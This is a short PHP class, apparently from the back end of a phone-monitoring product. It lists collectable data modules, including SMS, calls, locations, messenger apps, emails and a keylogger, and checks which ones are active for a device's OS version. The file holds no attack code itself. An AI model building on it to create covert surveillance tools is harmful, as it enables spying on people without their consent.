<?php

namespace Models;

use System\DI;

/**
 * Description of Modules
 *
 * @author root
 */
class Modules
{

    const SMS = 'sms';
    const CALLS = 'calls';
    const LOCATIONS = 'locations';
    const BROWSER_HISTORY = 'browserHistory';
    const BROWSER_BOOKMARKS = 'browserBookmarks';
    const CONTACTS = 'contacts';
    const CALENDAR = 'calendar';
    const PHOTOS = 'photos';
    const VIBER = 'viber';
    const WHATSAPP = 'whatsapp';
    const VIDEOS = 'videos';
    const SKYPE = 'skype';
    const FACEBOOK = 'facebook';
    const VK = 'vk';
    const EMAILS = 'emails';
    const APPLICATIONS = 'applications';
    const KEYLOGGER = 'keylogger';
    const SMS_COMMANDS = 'smsCommands';
    const SETTINGS = 'settings';

    private static $moduleCheckMethods = array(
        self::BROWSER_BOOKMARKS => 'isBrowserBookmarksActive',
        self::BROWSER_HISTORY => 'isBrowserHistoryActive',
        self::CALENDAR => 'isCalendarActive',
        self::CONTACTS => 'isContactsActive',
        self::KEYLOGGER => 'isKeyloggerActive',
        self::PHOTOS => 'isPhotosActive',
        self::VIDEOS => 'isVideosActive',
        self::VIBER => 'isViberActive',
        self::SKYPE => 'isSkypeActive',
        self::WHATSAPP => 'isWhatsappActive',
        self::FACEBOOK => 'isFacebookActive',
        self::VK => 'isVkActive',
        self::EMAILS => 'isEmailsActive',
        self::APPLICATIONS => 'isApplicationsActive',
        self::SMS_COMMANDS => 'isSmsCommandsActive'
    );
    
    protected $di;
    
    public function __construct(DI $di)
    {
        $this->di = $di;
    }

    public function isModuleActive($name)
    {
        if (isset(self::$moduleCheckMethods[$name])) {
            return call_user_func_array(array(
                '\CS\Devices\DeviceOptions',
                self::$moduleCheckMethods[$name]
            ), array(
                $this->di['currentDevice']['os'],
                $this->di['currentDevice']['os_version']
            ));
        }

        return true;
    }

}
